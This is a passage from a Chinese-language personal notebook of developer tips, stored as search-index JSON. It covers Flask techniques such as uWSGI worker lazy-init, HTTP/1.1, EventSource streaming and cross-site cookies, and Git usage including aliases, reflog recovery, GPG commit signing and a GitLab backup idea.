\u8fd9\u6837\u5229\u7528uwsgi\u81ea\u8eab\u5c31\u6709\u7684\u591a\u8fdb\u7a0b\u8d1f\u8f7d\u5747\u8861\uff0c\u6bcf\u6b21\u6700\u591a\u53ea\u4f1a\u6709\u4e00\u4e2a\u8fdb\u7a0b\u505a\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5176\u4ed6\u8fdb\u7a0b\u53ef\u4ee5\u6b63\u5e38\u5904\u7406\u8bf7\u6c42\uff1b\u574f\u5904\u5c31\u662f\u5728\u65e5\u5fd7\u91cc\u9762\u4ea7\u751f\u4e00\u4e9b\u5783\u573e\u5427\uff0c\u5f71\u54cd\u4e0d\u5927 \u95ee\u9898\u6765\u4e86 uwsgi\u600e\u4e48\u77e5\u9053\u5f53\u524d\u662f\u54ea\u4e2a\u8fdb\u7a0b\u5462 \u6211\u53d1\u73b0threading\u63d0\u4f9b\u7684\u8fdb\u7a0b\u540d\u79f0\u662f\u5b57\u7b26\u4e32 b'uWSGIWorker2Core2' \uff0c\u5176\u4e2d Worker \u540e\u9762\u7684\u6570\u5b57\u5c31\u662f\u8fdb\u7a0bID \u4e0d\u540c\u8fdb\u7a0bID\u7684\u5168\u5c40\u53d8\u91cf\u662f\u4e0d\u540c\u7684 \u4ee3\u7801\uff1a flask\u4e2d\u7684 /lazyinit \u5b9e\u73b0\uff0c\u8fd4\u56de\u5904\u7406\u5f53\u524d\u8bf7\u6c42\u7684worker id\uff1a import threading def get_workerid (): # return uwsgi worker id: int threadname = threading . current_thread () . name id_str = threadname . lower () . split ( \"worker\" )[ 1 ] . split ( \"core\" )[ 0 ] return int ( id_str ) HAS_INITED = False @app.route ( \"/lazyinit\" ) def lazyinit (): workerid = get_workerid () if not HAS_INITED : # skip init if has already initialized sleep ( 1 ) # do real init code... HAS_INITED = True return str ( workerid ) \u8fd9\u662f\u53cd\u590d\u8bf7\u6c42\u7684\u4ee3\u7801\uff0c\u91cd\u590d\u8bf7\u6c42\u6700\u591a100\u6b21\uff0c\u76f4\u5230\u6240\u67094\u4e2a\u8fdb\u7a0b\u90fd\u5df2\u7ecf\u89e6\u53d1\uff0c\u5176\u4e2duwsgi\u7684workerid\u662f\u4ece1\u5f00\u59cb\u8ba1\u6570\u7684 MAX_TRIES = 100 PROCESS_COUNT = 4 import requests i = 0 status = [ False ] * PROCESS_COUNT for i in range ( MAX_TRIES ): id = requests . get ( \"http://127.0.0.1/lazyinit?id=\" + str ( i )) . text id = int ( id ) - 1 status [ id ] = True if all ( status ): break","title":"lazyload \u5ef6\u8fdf\u52a0\u8f7d\u8017\u65f6\u7684\u521d\u59cb\u5316\u64cd\u4f5c"},{"location":"Flask/#apprunhttp11","text":"\u5c31\u662f\u8fd9\u4e2a\u95ee\u9898\uff1a https://www.reddit.com/r/flask/comments/634i5u/make_flask_return_header_response_with_http11/ \u4eba\u5bb6\u8ba4\u4e3aFlask\u4e0d\u652f\u6301\uff0c\u5176\u5b9eflask\u4f7f\u7528\u7684\u662f werkzeug.serving \uff0c\u6700\u5e95\u5c42\u8fd8\u662fBaseHTTPRequestHandler\uff0c\u800c\u8fd9\u4e2a\u662f\u652f\u6301HTTP/1.1\u7684\uff0c\u53ea\u662f\u9ed8\u8ba4HTTP/1.0\u800c\u5df2 \u5b9e\u9645\u53d1\u9001\u8bf7\u6c42 HTTP/1.1 200 OK \u662f\u8fd9\u4e2a\u7c7b\u7684 send_response \u51fd\u6570\uff0c\u7528\u5230 protocol_version \u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u8fd9\u4e2a\u5c5e\u6027\u662f\u7c7b\u7684\u5c5e\u6027\uff08\u4e0d\u662f\u5728 __init__ \u51fd\u6570\u8d4b\u503c\u7684\uff09\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 \u4e4b\u540e\u521b\u5efa\u7684\u5bf9\u8c61\u5c31\u4f1a\u81ea\u52a8\u62e5\u6709\u65b0\u7684\u503c \u5728\u8c03\u7528\u4e4b\u524d\u6dfb\u52a0\u4ee5\u4e0b\u51e0\u884c\u5373\u53ef try : from http.server import BaseHTTPRequestHandler except : #PY2 from BaseHTTPServer import BaseHTTPRequestHandler BaseHTTPRequestHandler . protocol_version = \"HTTP/1.1\"","title":"\u8ba9app.run\u542f\u52a8\u7684\u670d\u52a1\u5668\u4f7f\u7528HTTP/1.1"},{"location":"Flask/#render_template_1","text":"\u4e00\u79cd\u76f4\u63a5\u7684\u505a\u6cd5\uff1a\u6ce8\u610f\u987a\u5e8f \u5c40\u90e8\u53d8\u91cf\u4f18\u5148\u4e8e\u5168\u5c40\u53d8\u91cf targs = globals() targs.update(locals()) render_template(\"x.html\", **targs) \u7136\u800c\u8fd9\u6837\u9700\u8981\u6bcf\u4e2a\u89c6\u56fe\u51fd\u6570\u90fd\u5199\u8fd9\u4e09\u884c\uff0c\u4e0d\u591f\u4f18\u96c5 \u4e0d\u5982\u8bd5\u8bd5\uff1a\u83b7\u53d6\u8c03\u7528\u8005\u7684\u5c40\u90e8\u53d8\u91cf https://stackoverflow.com/questions/6618795/get-locals-from-calling-namespace-in-python import inspect def myrender_template ( filename ): backframe = inspect . currentframe () . f_back targs = {} targs . update ( backframe . f_globals ) targs . update ( backframe . f_locals ) return render_template ( filename , ** targs )","title":"\u8ba9render_template\u76f4\u63a5\u80fd\u4f7f\u7528\u5f53\u524d\u6240\u6709\u53d8\u91cf"},{"location":"Flask/#flaskeventsource","text":"\u8003\u8651\u6211\u4eec\u9700\u8981\u5411\u524d\u7aef\u63d0\u4f9b\u6d88\u606f\u961f\u5217\u7684\u6d88\u8d39\u8005\uff0c\u6bd4\u5982\u6536\u5230\u5e7f\u64ad\u540e\u53d1\u7ed9\u6d4f\u89c8\u5668\u901a\u77e5\u7528\u6237\u3002\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u7528websocket\uff0c\u4f46\u8fd9\u79cd\u573a\u666f\uff08\u53ea\u6709\u670d\u52a1\u5668\u7ed9\u6d4f\u89c8\u5668\u53d1\uff09\u4e0b\u53ea\u9700\u8981\u957f\u8fde\u63a5\u7684EventSource\u5c31\u884c\u4e86\u3002 \u57fa\u7840\u7bc7\uff1a https://stackoverflow.com/questions/12232304/how-to-implement-server-push-in-flask-framework def queue_consumer () : conn = \u521b\u5efa\u8fde\u63a5 () #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217 \uff0c \u521b\u5efa channel for data in conn . \u8bfb\u53d6\u6570\u636e () : yield b \"data: \" + data + b \"\\n\\n\" \u5173\u95ed\u8fde\u63a5 () # \u600e\u4e48\u6267\u884c\u5230 \uff1f @app . route ( \"/stream\" ) def stream () : return Response ( queue_consumer (), mimetype = \"text/event-stream\" ) \u8fd9\u4e2a\u7684\u95ee\u9898\u5728\u4e8e\u5173\u95ed\u8fde\u63a5\u4e0d\u4f1a\u6267\u884c\u5230\uff0c\u5728\u6d88\u606f\u961f\u5217\u670d\u52a1\u5668\u4e0a\u89c2\u5bdf\u5230channel\u4e00\u76f4\u6ca1\u6709\u91ca\u653e\uff0c\u8fd9\u80af\u5b9a\u4e0d\u884c\uff0c\u6211\u4eec\u9700\u8981\u5728\u6d4f\u89c8\u5668\u65ad\u5f00\u8fde\u63a5\u7684\u65f6\u5019\u81ea\u52a8\u91ca\u653econn\u7b49\u8d44\u6e90\u3002 \u8bfb\u4e86 werkzeug \u7684\u6e90\u4ee3\u7801\u53d1\u73b0 Response \u6709 call_on_close \u51fd\u6570\uff0c\u5728\u8fde\u63a5\u5173\u95ed\u7684\u65f6\u5019\u6211\u4eec\u628a\u751f\u6210\u5668close\u5373\u53ef\u89e6\u53d1yield\u7684\u5f02\u5e38\uff1a def queue_consumer () : conn = \u521b\u5efa\u8fde\u63a5 () #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217 \uff0c \u521b\u5efa channel try : for data in conn . \u8bfb\u53d6\u6570\u636e () : yield b \"data: \" + data + b \"\\n\\n\" #\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u89e6\u53d1GeneratorExit\u5f02\u5e38 except : pass \u5173\u95ed\u8fde\u63a5 () @app . route ( \"/stream\" ) def stream () : consumer = queue_consumer () res = Response ( consumer , mimetype = \"text/event-stream\" ) def onclose () : consumer . close () res . call_on_close ( onclose ) return res \u8fd9\u6837\u8fd8\u4e0d\u591f\uff0c\u53d1\u73b0\u65e0\u6cd5\u4f7f\u7528g\uff0c\u4ee5\u53caNginx\u9ed8\u8ba4\u7f13\u5b58\u54cd\u5e94\u5bfc\u81f4\u5ef6\u8fdf\uff0c\u9700\u8981\u7ee7\u7eed\u914d\u7f6e\uff1a def queue_consumer () : conn = \u521b\u5efa\u8fde\u63a5 () #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217 \uff0c \u521b\u5efa channel try : for data in conn . \u8bfb\u53d6\u6570\u636e () : yield b \"data: \" + data + b \"\\n\\n\" #\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u89e6\u53d1GeneratorExit\u5f02\u5e38 except : pass \u5173\u95ed\u8fde\u63a5 () @app . route ( \"/stream\" ) def stream () : consumer = queue_consumer () res = Response ( stream_with_context ( consumer ), mimetype = \"text/event-stream\" ) def onclose () : consumer . close () res . call_on_close ( onclose ) res . headers [ \"X-Accel-Buffering\" ] = \"no\" res . headers [ \"Cache-Control\" ] = \"no-cache\" return res \u8fd9\u4e9bNginx\u914d\u7f6e\u4f60\u4e5f\u53ef\u80fd\u9700\u8981\u52a0\u4e0a\uff1a\u5c24\u5176\u662f\u8fd8\u6709\u4e0b\u4e00\u5c42\u53cd\u4ee3\u7684\u65f6\u5019 uwsgi_pass_header \"X-Accel-Buffering\" ; uwsgi_read_timeout 120 s ; uwsgi_send_timeout 120 s ; proxy_http_version 1 . 1 ; proxy_set_header Connection \"\" ; proxy_pass_header \"X-Accel-Buffering\" ;","title":"\u5728Flask\u4e2d\u6b63\u786e\u5730\u4ea7\u751f\u6d41\u5f0f\u54cd\u5e94EventSource"},{"location":"Flask/#flaskcookie","text":"\u5f53\u6211\u4eec\u7684\u7f51\u7ad9\u80fd\u88ab\u8de8\u57df\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u8981\u6ce8\u610fcookie\u7684\u8bbe\u7f6e\uff0c\u52a0\u4e0a SameSite=None; Secure \u53c2\u8003: https://stackoverflow.com/questions/56828663/how-to-explicitly-set-samesite-none-on-a-flask-response https://github.com/pallets/werkzeug/issues/1549 https://stackoverflow.com/questions/62992831/python-session-samesite-none-not-being-set resp.set_cookie('cross-site-cookie', 'bar', samesite='None', secure=True) resp.headers.add('Set-Cookie','cross-site-cookie=bar; SameSite=None; Secure') Flask\u7684session cookie\u4e5f\u8981\u8de8\u57df\u7684\u8bdd\uff1a from flask import session from flask.sessions import SecureCookieSessionInterface session_cookie = SecureCookieSessionInterface () . get_signing_serializer ( app ) @app.after_request def cookies ( response ): same_cookie = session_cookie . dumps ( dict ( session )) response . headers . add ( \"Set-Cookie\" , f \"session={same_cookie}; Secure; HttpOnly; SameSite=None; Path=/;\" ) return response","title":"Flask\u8de8\u57dfCookie"},{"location":"Git/","text":"Git \u00b6 \u53c2\u8003 \u6c89\u6d78\u5f0f\u5b66 Git http://igit.linuxtoy.org/ \u53c2\u8003 Learn Git Branching learngitbranching.js.org \u7acb\u5373\u4f7f\u7528 \u00b6 \u5728\u7f51\u9875\u4e0a\u5148\u521b\u5efa\u4e86\u4ed3\u5e93\uff0c\u8bbe\u7f6e\u597d.gitignore git clone github\u63d0\u4f9b\u7684\u5730\u5740 ( \u7528ssh\u7684 ) # \u73b0\u5728\u521b\u5efa\u4e86\u4f60\u7684\u4ed3\u5e93\u6587\u4ef6\u5939\uff0c\u5c06\u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u653e\u8fdb\u53bb cd \u4f60\u7684\u4ed3\u5e93\u540d\u79f0 git add . git commit -a -m \"\u8fd9\u6b21\u6539\u4e86\u4e9b\u5565\uff1f\" git push \u66f4\u591a\u7684\u914d\u7f6e\uff1a # \u9ed8\u8ba4git pull --rebase git config --global pull.rebase true \u52a0\u901fgit clone \u00b6 \u65b9\u6cd51\uff1a\u914d\u7f6e\u4e00\u4e2a\u4ee3\u7406(\u5982privoxy)\uff0c\u5e76\u4f7f\u7528https\u5730\u5740 \u65b9\u6cd52\uff1a\u4f7f\u7528 --depth 1 \u53c2\u6570\u8868\u793a\u4e0d\u8981\u590d\u5236\u5386\u53f2 export https_proxy = \"http://127.0.0.1:8118\" git clone -- depth 1 https : // github . com / zjuchenyuan / notebook git push\u52a0\u901f \u00b6 \u4ee3\u7801\u53c2\u89c1 code/ssgit.txt git push\u514d\u5bc6\u7801 \u00b6 \u53c2\u7167http://blog.csdn.net/chfe007/article/details/43388041 \u9996\u5148\u751f\u6210\u81ea\u5df1\u7684ssh\u5bc6\u94a5\uff0c\u4e0d\u8981\u4fee\u6539\u751f\u6210\u7684\u6587\u4ef6\u4f4d\u7f6e ssh-keygen -t rsa -b 4096 \u7136\u540e\u628a ~/.ssh/id_rsa.pub \u7684\u5185\u5bb9\u8bbe\u7f6e\u5230github\u4e2d\uff0c \u7f51\u9875\u7aef\u64cd\u4f5c \uff1b\u5efa\u8bae\u987a\u5e26\u542f\u7528\u4e24\u6b65\u9a8c\u8bc1 \u65b0\u624b\u8fd8\u544a\u8bc9git\u81ea\u5df1\u662f\u8c01\uff1a git config --global user.email \"\u4f60\u7684\u90ae\u7bb1\" git config --global user.name \"\u4f60\u7684\u7528\u6237\u540d\" \u5982\u679c\u5f53\u524d\u4ed3\u5e93\u662fhttps\u7684\uff0c\u6539\u4e3agit\u65b9\u5f0f\uff1a git remote set-url origin git@github.com:\u7528\u6237\u540d/\u4ed3\u5e93\u540d\u79f0.git bash\u522b\u540d\u8bbe\u7f6e \u00b6 \u901a\u8fc7\u4fee\u6539~/.bashrc\u6765\u8bbe\u7f6e\u522b\u540d\uff0c\u8ba9git\u7684\u65e5\u5e38\u4f7f\u7528\u66f4\u7b80\u5355\uff1a func_g(){ git add . git commit -a -m \"$1\" git push } alias g=func_g alias gs='git status ' alias ga='git add ' alias gb='git branch ' alias gc='git commit' alias gd='git diff' alias go='git checkout ' alias gp='git push' alias gl=\"git log --all --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short\" \u5b8c\u6210\u4e00\u6b21\u63d0\u4ea4\uff0c\u73b0\u5728\u53ea\u9700\u8981 g \"\u63d0\u4ea4\u4fe1\u606f\" \u8981\u7acb\u5373\u751f\u6548\uff0c\u53ef\u4ee5\u6267\u884c source ~/.bashrc \u8bbe\u7f6ebash\u4e2d\u7684\u81ea\u52a8\u5b8c\u6210\u4e0edirty\u63d0\u793a \u00b6 \u6b64\u90e8\u5206\u5185\u5bb9\u6765\u81eaUdacity \u5982\u4f55\u4f7f\u7528 Git \u548c GitHub \u8bfe\u7a0b \u4e0b\u8f7d\u9700\u8981\u7684\u6587\u4ef6 curl -O https://raw.githubusercontent.com/git/git/master/contrib/completion/git-completion.bash curl -O https://raw.githubusercontent.com/git/git/master/contrib/completion/git-prompt.sh \u5728 ~/.bashrc \u672b\u5c3e\u6dfb\u52a0\uff1a source ~/ git - completion . bash green = \"\\[ \\033 [0;32m\\]\" blue = \"\\[ \\033 [0;34m\\]\" purple = \"\\[ \\033 [0;35m\\]\" reset = \"\\[ \\033 [0m\\]\" source ~/ git - prompt . sh export GIT_PS1_SHOWDIRTYSTATE = 1 export PS1 = \"$purple\\u$green\\$(__git_ps1) \\w \\a $ $reset\" \u6548\u679c\u5982\u56fe\uff0c\u5982\u679c\u51fa\u73b0\u4e86\u672a\u63d0\u4ea4\u7684\u4fee\u6539\uff0c\u4f1a\u81ea\u52a8\u663e\u793a\u51fa*\u8868\u793adirty\uff1a \u597d\u73a9\u7684\u547d\u4ee4\u4eec \u00b6 git status \u00b6 \u67e5\u770b\u72b6\u6001\u54af~ git reset \u00b6 \u5df2\u7ecf git add \u4e86\uff0c\u60f3\u53d6\u6d88\u8fd9\u4e00\u6b65\u5c31\u7528 git reset git checkout \u00b6 \u554a\u3002\u3002\u3002\u4ee3\u7801\u641e\u574f\u4e86\u6211\u8981\u56de\u6eda\u5230\u4e0a\u6b21commit\uff0c\u7528 git checkout -- \u6587\u4ef6\u540d git reset \u2013soft \u00b6 \u64a4\u9500\u5230\u67d0\u6b21commit\uff0c\u4f46\u4e0d\u5220\u9664\u65b0\u589e\u6587\u4ef6 \u5176\u4e2dcommit_id\u53ef\u4ee5\u4ece git log \u83b7\u5f97 \u6062\u590dgit reset \u2013hard\u5220\u9664\u7684\u6587\u4ef6 \u00b6 git\u7684\u5386\u53f2\u662f\u4e0d\u80fd\u7528\u547d\u4ee4\u4fee\u6539\u7684\uff0c\u4e22\u5931\u7684commit\u7528reflog\u53ef\u4ee5\u627e\u56de\uff0c\u9664\u975egit\u5df2\u7ecf\u628a\u5b83\u5f53\u6210\u5783\u573e\u5220\u9664\uff0830\u5929\uff09 git stash save git reflog # \u67e5\u770b\u4e22\u5931\u7684\u90a3\u4e2acommit\u7684id git checkout \u90a3\u4e2acommitid git branch recover # \u521b\u5efarecover\u5206\u652f git checkout master # \u56de\u5230master git merge recover # \u5408\u5e76recover\u5230master git branch -d recover # \u5408\u5e76\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u5220\u4e86 \u4f60\u53ef\u80fd\u4f1a\u95ee\u7684\u4e00\u4e9b\u95ee\u9898 \u00b6 \u4e3a\u5565\u8981 git add \u5462? \u56e0\u4e3a\u6709\u4e9b\u65f6\u5019\u4e24\u4e2a\u6587\u4ef6\u53ef\u80fd\u662f\u4e0d\u76f8\u5173\u7684\u4fee\u6539\uff0c\u5e94\u8be5\u5206\u522b\u63d0\u4ea4\u4e24\u6b21 \u901a\u8fc7\u5206\u5f00\u6682\u5b58\u548c\u63d0\u4ea4\uff0c\u4f60\u80fd\u591f\u66f4\u52a0\u5bb9\u6613\u5730\u8c03\u4f18\u6bcf\u4e00\u4e2a\u63d0\u4ea4\u3002 \u4e3a\u5565\u4e0d\u6539.profile\u800c\u662f\u6539.bashrc\u5462 \u56e0\u4e3awin10\u4e2d\u53ea\u8981\u6709\u4e00\u4e2abash\u7a97\u53e3\u6ca1\u5173\u6389\uff0c\u542f\u52a8bash\u5c31\u4e0d\u662f\u767b\u5f55\uff0c\u800c\u662f\u76f8\u5f53\u4e8e\u518d\u5f00\u4e86\u4e2a docker exec -i -t bashonwin10 /bin/bash \u6b64\u65f6\u662f\u4e0d\u4f1a\u6267\u884c\u767b\u5f55\u811a\u672c.profile\u7684\uff0c\u4f46\u662f.bashrc\u8fd8\u662f\u4f1a\u6267\u884c\u7684 Git\u5404\u79cd\u60c5\u666f \u00b6 Learned from githug \u5ffd\u7565*.a\u6587\u4ef6\u4f46\u4e0d\u60f3\u5ffd\u7565lib.a \u00b6 \u6587\u6863\u67e5\u770b\uff1a git gitignore --help !\u8868\u793a\u8d1f\u5411\u9009\u62e9\uff0c\u5728.gitignore\u4e2d\u6dfb\u52a0\uff1a * . a !lib.a commit\u8865\u4e0a\u5fd8\u6389\u7684\u6587\u4ef6 \u00b6 \u5982\u679c\u53d1\u73b0\u4e0a\u6b21commit\u6f0f\u4e86\u6587\u4ef6\uff0c\u4e0d\u5e94\u8be5\u65b0\u52a0commit\u800c\u662f\u5e94\u8be5\u7528amend\uff0c\u5426\u5219\u53ef\u80fd\u4e0aCI\u5c31\u6302 git add forgotten.txt git commit --amend \u67e5\u51fa\u6b64\u884c\u4ee3\u7801\u7684\u6700\u540e\u4fee\u6539\u8005 \u00b6 github\u63d0\u4f9b\u7684blame\u529f\u80fd\u66f4\u597d\u770b\uff0c\u663e\u793a\u6bcf\u884c\u4ee3\u7801\u7684\u4f5c\u8005\u548c\u6765\u6e90\u4e8e\u54ea\u6b21commit git blame filename \u6587\u4ef6\u4e00\u6b21\u6027\u6539\u592a\u591a\u4e86\uff0c\u62c6\u6210\u591a\u6b21commit \u00b6 \u8ba9\u6bcf\u6b21commit\u4fdd\u6301\u5728\u6bd4\u8f83\u5c0f\u7684\u6539\u52a8\uff0c\u4e0d\u8981\u5728\u4e00\u4e2acommit\u4e2d\u51fa\u73b0\u4e24\u4e2a\u4e0d\u90a3\u4e48\u76f8\u5173\u7684\u4fee\u6539 \u672c\u77e5\u8bc6\u5b66\u4e60\u81ea\uff1a 10 \u4e2a\u8fc5\u901f\u63d0\u5347\u4f60 Git \u6c34\u5e73\u7684\u63d0\u793a \u65b9\u6cd5\u662f\u5728add\u7684\u65f6\u5019\u7ed9\u51fa\u53c2\u6570-p \u7136\u540egit\u4f1a\u5728\u6bcf\u4e00\u4e2a\u4fee\u6539\u7684block\u8be2\u95ee\u662f\u5426\u52a0\u5165\u8fd9\u6b21\u7684commit\uff0c\u56de\u7b54y\u8868\u793a\u52a0\u5165\uff0cn\u8868\u793a\u4e0d\u52a0\u5165\uff0cs\u8868\u793a\u8fdb\u4e00\u6b65\u62c6\u5206\u8fd9\u4e2ablock \u5b8c\u6210\u597d\u9009\u62e9\u540e\uff0c\u4f7f\u7528 git diff --staged \u547d\u4ee4\u6765\u67e5\u8be2\u6682\u5b58\u7684\u4fee\u6539\uff0c\u6ca1\u6709\u95ee\u9898\u5c31\u53ef\u4ee5\u7ee7\u7eed git commit \u5566 \u672c\u5730\u5ffd\u7565\u4e00\u4e9b\u4e2a\u4eba\u7684\u4fee\u6539 \u00b6 \u539f\u6587\uff1a http://stackoverflow.com/questions/1753070/git-ignore-files-only-locally \u6709\u65f6\u5019\u6211\u4eec\u4e0d\u60f3\u8ba9git\u8ffd\u8e2a\u4e00\u4e9b\u4e2a\u4eba\u76f8\u5173\u7684\u6587\u4ef6\uff0c\u4f8b\u5982config\u4e2d\u4fee\u6539Debug=True\uff0c\u6b64\u65f6\u5982\u679c\u53bb\u4fee\u6539.gitignore\u9020\u6210\u7684\u5f71\u54cd\u662f\u5168\u5c40\u7684\uff0c\u5e76\u4e14\u9700\u8981\u4ecegit\u4e2d\u5220\u9664\u8fd9\u4e2a\u6587\u4ef6\uff1b\u624b\u52a8\u907f\u5f00add config\u5f88\u70e6\uff0c\u6709\u6ca1\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff0c\u8ba9git\u5ffd\u7565\u6389config\u6587\u4ef6\u7684\u4fee\u6539\u5462\uff1f \u65b9\u6cd5\u662f\u4fee\u6539 .git/info/exclude \u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u7684\u8bed\u6cd5\u89c4\u5219\u4e0e.gitignore\u4e00\u6837 \u5982\u679c\u5df2\u7ecf\u9020\u6210\u4e86\u4fee\u6539\uff0c\u8fd8\u9700\u8981\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a git update-index --assume-unchanged [<file>...] \u672c\u5730\u521b\u5efabranch\u540epush\u64cd\u4f5cgit push -u \u00b6 From: http://stackoverflow.com/questions/2765421/how-do-i-push-a-new-local-branch-to-a-remote-git-repository-and-track-it-too \u6267\u884c\u4e86\u4e00\u4e9b\u4fee\u6539\u5f15\u5165\u65b0\u529f\u80fd\uff0c\u4f46\u8fd8\u4e0d\u80fd\u5de5\u4f5c\uff0c\u51b3\u5b9a\u5efa\u7acb\u4e00\u4e2adev\u5206\u652f\uff1a git checkout -b dev \u73b0\u5728\u518d\u6267\u884c git add \uff0c git commit \u540e\uff0c\u9700\u8981\u628a\u65b0\u7684\u5206\u652fpush\u7ed9\u8fdc\u7a0b\u670d\u52a1\u5668\uff1a git push -u origin dev \u7528gpg\u7ed9git\u63d0\u4ea4\u7b7e\u540d \u00b6 \u53c2\u8003\uff1ahttps://help.github.com/articles/signing-commits-with-gpg/ \u4e0b\u8ff0\u4ee5ubuntu16.04\uff08\u5176\u5b9e\u662fbash on win10\uff09\u8bb2\u89e3\u6574\u4e2a\u8fc7\u7a0b \u5b89\u88c5gpg2 \u00b6 \u67e5\u770bgpg\u7248\u672c\uff1a gpg --version \u53d1\u73b0\u7248\u672c\u662f gpg (GnuPG) 1.4.20 \uff0c\u800c\u6559\u7a0b\u8981\u6c42\u89812\u4ee5\u4e0a\uff0c\u6240\u4ee5\u5148\u8981\u5b89\u88c5gpg2\uff0c\u5e76\u544a\u8bc9git\u6211\u4eec\u8981\u4f7f\u7528gpg2\uff1a apt install -y gpg2 git config --global gpg.program gpg2 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684key \u00b6 \u8fd9\u91ccgithub\u7ed9\u51fa\u7684\u547d\u4ee4\u6709\u95ee\u9898\uff0cgoogle\u53d1\u73b0\u53c2\u6570\u6539\u4e86 gpg2 --full-gen-key \u56de\u8f66\u9009\u62e9RSA and RSA\uff0c\u7136\u540e\u8f93\u5165\u5bc6\u94a5\u5927\u5c0f\u8f93\u51654096\uff0c\u7136\u540e\u56de\u8f66\u6c38\u4e0d\u8fc7\u671f\uff0c\u786e\u8ba4y\uff0c\u7136\u540e\u8f93\u5165\u81ea\u5df1\u7684\u540d\u5b57\u548c\u90ae\u7bb1 \u6ce8\u610f\u8fd9\u91cc\u90ae\u7bb1\u8981\u548cgit commit\u7528\u5230\u7684\u90ae\u7bb1\u4e00\u81f4 \u5bfc\u51fakey\u7684\u516c\u94a5 \u5728github\u8bbe\u7f6e\u4e2d\u63d0\u4ea4 \u00b6 gpg2 --list-secret-keys --keyid-format LONG \u5982\u4e0b\u8f93\u51fa\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u7684\u662f3AA5C34371567BD2\u8fd9\u4e00\u4e32 \u5c31\u662fsec\u90a3\u4e00\u884c\u76844096R/\u540e\u9762\u7684\u4e1c\u897f $ gpg2 --list-secret-keys --keyid-format LONG /Users/hubot/.gnupg/secring.gpg ------------------------------------ sec 4096R/3AA5C34371567BD2 2016 -03-10 [ expires: 2017 -03-10 ] uid Hubot ssb 4096R/42B317FD4BA89E7A 2016 -03-10 \u7136\u540e\u5f97\u5230\u516c\u94a5\uff1a gpg2 -- armor -- export 3 AA5C34371567BD2 \u590d\u5236\u5c4f\u5e55\u4e0a\u8f93\u51fa\u7684\u4e00\u5927\u4e32\uff0c\u6253\u5f00\u4e0b\u9762\u7684\u7f51\u9875 \u7c98\u8d34\u63d0\u4ea4 https://github.com/settings/gpg/new \u914d\u7f6egit\u4f7f\u7528gpg\u7b7e\u540d \u00b6 \u544a\u8bc9git\u9ed8\u8ba4\u4f7f\u7528\u8fd9\u4e2akey\uff1a git config --global user.signingkey 3AA5C34371567BD2 git config --global commit.gpgsign true \u6267\u884c \u5efa\u8bae\u5c06\u8fd9\u4e00\u884c\u5199\u5165~/.bashrc\uff1a export GPG_TTY =$ ( tty ) \u7136\u540e\u5c31\u662f\u6b63\u5e38\u7684git add .\uff0cgit commit -m \u201cmessage\u201d\u54af gpg-agent\u4f1a\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u9ed8\u8ba410\u5206\u949f\u5185\u4e0d\u9700\u8981\u518d\u6b21\u8f93\u5165\u5bc6\u7801 \u4fee\u6539gpg\u8981\u6c42\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u7684\u65f6\u95f4\u9650\u5236 \u00b6 10\u5206\u949f\u7684\u9ed8\u8ba4\u9650\u5236\u8fd8\u662f\u592a\u77ed\u4e86\uff0c\u5bf9\u4e8e\u5b89\u5168\u6027\u8981\u6c42\u4e0d\u9ad8\u7684\u60c5\u666f\uff08\u6bd4\u5982\u81ea\u5df1\u7684\u5f00\u6e90\u4ee3\u7801push\u5230github\uff09\uff0c\u4e0d\u59a8\u8bbe\u7f6e\u4e3a\u5bc6\u7801\u4e00\u76f4\u6709\u6548\uff0c\u76f4\u5230gpg-agent\u91cd\u542f \u4e0b\u9762\u7684\u8bbe\u7f6e\u5c06\u9650\u5236\u6539\u52301\u5e74\uff0c\u5f53\u7136gpg-agent\u91cd\u542f\u8fd8\u662f\u8981\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u7684\uff1a vi ~/ . gnupg / gpg - agent . conf default - cache - ttl 34560000 max - cache - ttl 34560000 \u4f7f\u7528GitLab API\u5b58\u50a8\u6570\u636e\u5907\u4efd\u6587\u4ef6 \u4e0d\u5360\u7528\u672c\u5730\u7a7a\u95f4 \u00b6 \u8fd9\u91cc\u7684\u9700\u6c42\u662f\u5b9a\u65f6\u4efb\u52a1\u751f\u6210snapshot\u6587\u4ef6\uff0c\u6253\u7b97\u4f20\u81f3\u514d\u8d39\u5b58\u50a8\u4f5c\u4e3a\u5907\u4efd\uff0c\u4e0d\u60f3\u5360\u7528\u670d\u52a1\u5668\u786c\u76d8\u53bb\u5b58\u50a8\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4e5f\u4e0d\u60f3\u82b1\u94b1\u4e70\u5b58\u50a8\u670d\u52a1 \u4e8e\u662f\u60f3\u5230\u514d\u8d39\u7684gitlab.com\u7684\u79c1\u6709\u4ed3\u5e93\uff0c\u4ed3\u5e93\u6570\u91cf\u65e0\u9650\uff0c \u6bcf\u4e2arepo\u53ef\u4ee5\u5b5810GB \u4f7f\u7528API\u6765\u63d0\u4ea4\u53ef\u4ee5\u907f\u514d\u5360\u7528\u672c\u5730\u7a7a\u95f4 \u5176\u5b9e\u672c\u6765\u6253\u7b97\u7528github\u7684\uff0c\u4f46\u662fgithub\u4eca\u5929(20181022)\u6302\u4e86\uff0c\u4e8e\u662f\u5c31gitlab\u5427 \u627e\u5230\u8fd9\u4e2apython sdk: https://python-gitlab.readthedocs.io/ 